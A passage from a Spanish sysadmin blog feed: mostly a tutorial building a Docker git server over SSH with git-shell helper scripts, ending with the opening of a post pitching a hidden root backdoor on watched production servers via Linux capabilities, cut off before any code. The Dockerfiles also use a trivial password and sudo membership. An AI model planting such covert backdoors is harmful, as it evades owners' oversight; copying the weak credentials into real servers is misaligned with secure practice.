&lt;p&gt;&lt;img alt="HAProxy Stats" src="http://www.linuxsysadmin.ml/images/haproxy-stats.jpg"&gt;&lt;/p&gt;</content><category term="balanceador"></category><category term="haproxy"></category><category term="ansible"></category><category term="docker"></category></entry><entry><title>Preparando un servidor de repositorios GIT</title><link href="http://www.linuxsysadmin.ml/2016/06/preparando-un-servidor-de-repositorios-git.html" rel="alternate"></link><published>2016-06-20T08:30:00+02:00</published><updated>2016-06-20T08:30:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-20:/2016/06/preparando-un-servidor-de-repositorios-git.html</id><summary type="html">&lt;p&gt;Algunas veces tenemos necesidad de crear un proyecto con un equipo pequeño y necesitamos versionarlo en un sitio accesible para todos los participantes involucrados. El precio de soluciones en la nube suele ser prohibitivo, y montar una solución gráfica puede ser demasiado. Lo podemos hacer simplemente usando &lt;strong&gt;git&lt;/strong&gt; y &lt;strong&gt;ssh …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces tenemos necesidad de crear un proyecto con un equipo pequeño y necesitamos versionarlo en un sitio accesible para todos los participantes involucrados. El precio de soluciones en la nube suele ser prohibitivo, y montar una solución gráfica puede ser demasiado. Lo podemos hacer simplemente usando &lt;strong&gt;git&lt;/strong&gt; y &lt;strong&gt;ssh&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es muy simple; solo se necesita un servidor de &lt;strong&gt;ssh&lt;/strong&gt;, que es la forma de transportar los datos, y los binarios de &lt;strong&gt;git&lt;/strong&gt; para que los organice a placer. También vamos a necesitar un usuario &lt;strong&gt;git&lt;/strong&gt;, que es el que vamos a usar para entrar, ya sea para crear y borrar repositorios, como para las operaciones remotas recibidas por el repositorio.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Podemos eliminar la petición de &lt;em&gt;password&lt;/em&gt; para todos los accesos que se hagan por &lt;strong&gt;SSH&lt;/strong&gt;, sean para entrar en las máquinas por &lt;strong&gt;SSH&lt;/strong&gt; mediante cualquier &lt;em&gt;shell&lt;/em&gt; de este artículo, o como resultado de una operación remota de &lt;strong&gt;git&lt;/strong&gt;. Esto se puede hacer usando autenticación &lt;strong&gt;SSH&lt;/strong&gt; por claves, como se explica en un &lt;a href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html"&gt;artículo anterior&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Montando el servidor&lt;/h2&gt;
&lt;p&gt;Para crear la máquina base, vamos a utilizar &lt;strong&gt;Docker&lt;/strong&gt; por comodidad. Aprovechando esta tecnología, podemos crear el contenedor partiendo de una imagen creada con un &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y git openssh-server &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /var/run/sshd
RUN useradd git -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;git:git&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen, basándonos en el anterior &lt;em&gt;Dockerfile&lt;/em&gt;, y le añadimos el &lt;em&gt;tag&lt;/em&gt; "gitserver".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -t gitserver .
Sending build context to Docker daemon &lt;span class="m"&gt;5&lt;/span&gt;.632 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie
 ---&amp;gt; bb5d89f9b6cb
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y git openssh-server &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /var/run/sshd
 ---&amp;gt; Running in 6b612781b788
...
 ---&amp;gt; e88e644b0a53
Removing intermediate container 6b612781b788
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN useradd git -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;git:git&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
 ---&amp;gt; Running in 0e865bda447e
 ---&amp;gt; 81d111c19c71
Removing intermediate container 0e865bda447e
Step &lt;span class="m"&gt;4&lt;/span&gt; : CMD /usr/sbin/sshd -D
 ---&amp;gt; Running in 67bbebe61c74
 ---&amp;gt; 81c2dd7b156a
Removing intermediate container 67bbebe61c74
Successfully built 81c2dd7b156a
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos una instancia del contenedor para que podamos utilizarla. La parte importante es el &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;-d&lt;/strong&gt; para ejecutar el contenedor en &lt;em&gt;background&lt;/em&gt;, y el &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;-p&lt;/strong&gt; que nos permite publicar el puerto 22 del contenedor en el puerto 22222 de la máquina &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run -d --name gitserver1 -h gitserver1 -p &lt;span class="m"&gt;22222&lt;/span&gt;:22 gitserver
c26f30a94bb75b35c6d6cfe6a6bc5b1ef6929aafe1b5636acd207e019743540b
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a entrar en el servidor &lt;strong&gt;SSH&lt;/strong&gt; para crear el repositorio &lt;em&gt;myrepo.git&lt;/em&gt; que nos va a servir de ejemplo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ ssh git@localhost -p &lt;span class="m"&gt;22222&lt;/span&gt;
git@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
git@gitserver1:~$ git init --bare myrepo.git
Initialized empty Git repository in /home/git/myrepo.git/
git@gitserver1:~$ &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;logout&lt;/span&gt;
Connection to localhost closed.
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Desde la máquina &lt;em&gt;host&lt;/em&gt; (o desde cualquier otra), podemos clonar el repositorio. Como tenemos el puerto del contenedor publicado en el puerto 22222 de la máquina &lt;em&gt;host&lt;/em&gt; (la de trabajo, en este caso), la usamos tal cual para clonar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ git clone ssh://git@localhost:22222/home/git/myrepo.git
Cloning into &lt;span class="s1"&gt;&amp;#39;myrepo&amp;#39;&lt;/span&gt;...
git@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
warning: You appear to have cloned an empty repository.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hacemos un poco de trabajo local, con sus respectivos &lt;em&gt;commits&lt;/em&gt;. Finalmente podemos hacer un &lt;em&gt;push&lt;/em&gt; a nuestro repositorio remoto, siguiendo el &lt;em&gt;workflow&lt;/em&gt; de trabajo que queramos seguir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ &lt;span class="nb"&gt;cd&lt;/span&gt; myrepo/
gerard@sirius:~/build/myrepo$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.1 &amp;gt; VERSION
gerard@sirius:~/build/myrepo$ git add VERSION 
gerard@sirius:~/build/myrepo$ git commit -m &lt;span class="s2"&gt;&amp;quot;Initial commit&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;master &lt;span class="o"&gt;(&lt;/span&gt;root-commit&lt;span class="o"&gt;)&lt;/span&gt; f30b82a&lt;span class="o"&gt;]&lt;/span&gt; Initial commit
 &lt;span class="m"&gt;1&lt;/span&gt; file changed, &lt;span class="m"&gt;1&lt;/span&gt; insertion&lt;span class="o"&gt;(&lt;/span&gt;+&lt;span class="o"&gt;)&lt;/span&gt;
 create mode &lt;span class="m"&gt;100644&lt;/span&gt; VERSION
gerard@sirius:~/build/myrepo$ git push -u origin master
git@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Counting objects: &lt;span class="m"&gt;3&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Writing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;222&lt;/span&gt; bytes &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; bytes/s, &lt;span class="k"&gt;done&lt;/span&gt;.
Total &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
To ssh://git@localhost:22222/home/git/myrepo.git
 * &lt;span class="o"&gt;[&lt;/span&gt;new branch&lt;span class="o"&gt;]&lt;/span&gt;      master -&amp;gt; master
Branch master &lt;span class="nb"&gt;set&lt;/span&gt; up to track remote branch master from origin.
gerard@sirius:~/build/myrepo$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo restricciones a la sesión SSH&lt;/h2&gt;
&lt;p&gt;Es un poco peligroso permitir que el usuario &lt;em&gt;git&lt;/em&gt; entre mediante una sesión &lt;strong&gt;SSH&lt;/strong&gt; para hacer lo que le parezca.&lt;/p&gt;
&lt;p&gt;Los mismos binarios de &lt;strong&gt;git&lt;/strong&gt; incluyen &lt;strong&gt;git-shell&lt;/strong&gt;, que es un &lt;em&gt;shell&lt;/em&gt; que limita lo que puede hacer el usuario, aunque solo permitiría hacer las operaciones &lt;em&gt;push&lt;/em&gt; y &lt;em&gt;pull&lt;/em&gt; propias del trabajo remoto con &lt;strong&gt;git&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;¿Y como podemos crear y destruir repositorios? En principio, no se puede. Sin embargo, si creamos una carpeta &lt;em&gt;/home/git/git-shell-commands/&lt;/em&gt;, el usuario va a poder ejecutar los &lt;em&gt;scripts&lt;/em&gt; que allí pongamos.&lt;/p&gt;
&lt;p&gt;Siguiendo esta idea, vamos a mejorar el &lt;em&gt;Dockerfile&lt;/em&gt; para asignar &lt;strong&gt;git-shell&lt;/strong&gt; al usuario &lt;em&gt;git&lt;/em&gt; y para ponerle un par de comandos.&lt;/p&gt;
&lt;p&gt;Vamos a crear dos &lt;em&gt;scripts&lt;/em&gt; que nos permitan crear y destruir repositorios, que son los siguientes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat create 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${#}&lt;/span&gt; -ne &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[ERROR] Syntax: create &amp;lt;repository&amp;gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt; -1
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -e &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.git &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[ERROR] Repository &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; exists&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt; -1
&lt;span class="k"&gt;fi&lt;/span&gt;

git init --bare &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.git
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[OK] Repository &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; created&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
gerard@sirius:~/build$ cat destroy 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${#}&lt;/span&gt; -ne &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[ERROR] Syntax: destroy &amp;lt;repository&amp;gt;&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt; -1
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -e &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.git &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    rm -Rf &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;.git
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[OK] Repository &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; deleted&amp;quot;&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[ERROR] Repository &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; does not exist&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt; -1
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;También vamos a reescribir el &lt;em&gt;Dockerfile&lt;/em&gt; con las nuevas modificaciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile.shell 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y git openssh-server &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /var/run/sshd
RUN useradd git -G sudo -s /usr/bin/git-shell -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;git:git&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /home/git/git-shell-commands
COPY create destroy /home/git/git-shell-commands/
RUN cp /usr/share/doc/git/contrib/git-shell-commands/help /home/git/git-shell-commands/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    cp /usr/share/doc/git/contrib/git-shell-commands/list /home/git/git-shell-commands/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    chmod &lt;span class="m"&gt;755&lt;/span&gt; /home/git/git-shell-commands/*
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos la imagen usando el &lt;em&gt;Dockerfile&lt;/em&gt; antes mencionado, siguiendo el mismo procedimiento de la versión básica. Le ponemos un &lt;em&gt;tag&lt;/em&gt; distinto para tener ambas imágenes funcionales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -f Dockerfile.shell -t gitserver:shell .
Sending build context to Docker daemon &lt;span class="m"&gt;53&lt;/span&gt;.25 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie
 ---&amp;gt; bb5d89f9b6cb
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y git openssh-server &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /var/run/sshd
 ---&amp;gt; Using cache
 ---&amp;gt; e88e644b0a53
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN useradd git -G sudo -s /usr/bin/git-shell -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;git:git&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /home/git/git-shell-commands
 ---&amp;gt; Running in 387d2791d63f
 ---&amp;gt; 0ab419cdfc2d
Removing intermediate container 387d2791d63f
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY create destroy /home/git/git-shell-commands/
 ---&amp;gt; e1aa5fa9cb44
Removing intermediate container 92fd282c6979
Step &lt;span class="m"&gt;5&lt;/span&gt; : RUN cp /usr/share/doc/git/contrib/git-shell-commands/help /home/git/git-shell-commands/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     cp /usr/share/doc/git/contrib/git-shell-commands/list /home/git/git-shell-commands/ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     chmod &lt;span class="m"&gt;755&lt;/span&gt; /home/git/git-shell-commands/*
 ---&amp;gt; Running in 45ed8f24a547
 ---&amp;gt; 2237b87165bc
Removing intermediate container 45ed8f24a547
Step &lt;span class="m"&gt;6&lt;/span&gt; : CMD /usr/sbin/sshd -D
 ---&amp;gt; Running in b94b8c1ddf8a
 ---&amp;gt; e484e1465480
Removing intermediate container b94b8c1ddf8a
Successfully built e484e1465480
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos una instancia de la imagen creada. Es importante cambiar el puerto; puesto que el 22222 está ocupado por la instancia anterior, usaré el siguiente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run -d --name gitserver2 -h gitserver2 -p &lt;span class="m"&gt;22223&lt;/span&gt;:22 gitserver:shell
e732027d11b90657ff109a455f032327f0e24eebe54a7e121d86eff6eab1bc4b
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entramos por &lt;strong&gt;SSH&lt;/strong&gt;. Nos podemos dar cuenta de que el &lt;em&gt;prompt&lt;/em&gt; ha cambiado; estamos en el &lt;strong&gt;git-shell&lt;/strong&gt; y tenemos limitados los comandos a los que añadimos en el &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ ssh git@localhost -p &lt;span class="m"&gt;22223&lt;/span&gt;
git@localhost&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;

&lt;span class="s1"&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;
&lt;span class="s1"&gt;the exact distribution terms for each program are described in the&lt;/span&gt;
&lt;span class="s1"&gt;individual files in /usr/share/doc/*/copyright.&lt;/span&gt;

&lt;span class="s1"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&lt;/span&gt;
&lt;span class="s1"&gt;permitted by applicable law.&lt;/span&gt;
&lt;span class="s1"&gt;Run &amp;#39;&lt;/span&gt;help&lt;span class="s1"&gt;&amp;#39; for help, or &amp;#39;&lt;/span&gt;exit&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; to leave.  Available commands:
create
destroy
list
git&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Usamos el comando &lt;em&gt;create&lt;/em&gt; para crear el repositorio y verificamos que está usando el comando &lt;em&gt;list&lt;/em&gt;. Tendríamos disponible el comando &lt;em&gt;destroy&lt;/em&gt;, pero de momento no lo vamos a utilizar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git&amp;gt; create myrepo2
Initialized empty Git repository in /home/git/myrepo2.git/
&lt;span class="o"&gt;[&lt;/span&gt;OK&lt;span class="o"&gt;]&lt;/span&gt; Repository myrepo2 created
git&amp;gt; list
myrepo2.git
git&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
Connection to localhost closed.
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Verificamos que funciona, clonando el repositorio como hemos hecho antes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ git clone ssh://git@localhost:22223/home/git/myrepo2.git
Cloning into &lt;span class="s1"&gt;&amp;#39;myrepo2&amp;#39;&lt;/span&gt;...
git@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
warning: You appear to have cloned an empty repository.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hacemos algunos &lt;em&gt;commits&lt;/em&gt; locales y finalmente los pasamos al repositorio remoto mediante un &lt;em&gt;push&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ &lt;span class="nb"&gt;cd&lt;/span&gt; myrepo2/
gerard@sirius:~/build/myrepo2$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.1 &amp;gt; VERSION
gerard@sirius:~/build/myrepo2$ git add VERSION
gerard@sirius:~/build/myrepo2$ git commit -m &lt;span class="s2"&gt;&amp;quot;Initial commit&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;master &lt;span class="o"&gt;(&lt;/span&gt;root-commit&lt;span class="o"&gt;)&lt;/span&gt; fd40f39&lt;span class="o"&gt;]&lt;/span&gt; Initial commit
 &lt;span class="m"&gt;1&lt;/span&gt; file changed, &lt;span class="m"&gt;1&lt;/span&gt; insertion&lt;span class="o"&gt;(&lt;/span&gt;+&lt;span class="o"&gt;)&lt;/span&gt;
 create mode &lt;span class="m"&gt;100644&lt;/span&gt; VERSION
gerard@sirius:~/build/myrepo2$ git push -u origin master
git@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Counting objects: &lt;span class="m"&gt;3&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Writing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;222&lt;/span&gt; bytes &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; bytes/s, &lt;span class="k"&gt;done&lt;/span&gt;.
Total &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
To ssh://git@localhost:22223/home/git/myrepo2.git
 * &lt;span class="o"&gt;[&lt;/span&gt;new branch&lt;span class="o"&gt;]&lt;/span&gt;      master -&amp;gt; master
Branch master &lt;span class="nb"&gt;set&lt;/span&gt; up to track remote branch master from origin.
gerard@sirius:~/build/myrepo2$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="git"></category><category term="ssh"></category><category term="docker"></category></entry><entry><title>Un root shell en C</title><link href="http://www.linuxsysadmin.ml/2016/06/un-root-shell-en-c.html" rel="alternate"></link><published>2016-06-13T08:00:00+02:00</published><updated>2016-06-13T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-13:/2016/06/un-root-shell-en-c.html</id><summary type="html">&lt;p&gt;Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario &lt;em&gt;root&lt;/em&gt;, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el &lt;em&gt;setuid&lt;/em&gt; bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario &lt;em&gt;root&lt;/em&gt;, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el &lt;em&gt;setuid&lt;/em&gt; bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta.&lt;/p&gt;
&lt;p&gt;El truco esta en las &lt;em&gt;linux capabilities&lt;/em&gt;, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El resto es tan fácil como hacer un binario que escale a &lt;em&gt;root&lt;/em&gt; y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos &lt;strong&gt;bash&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Aquí ponemos el código fuente necesario para hacer lo que pretendemos.&lt;/p&gt;
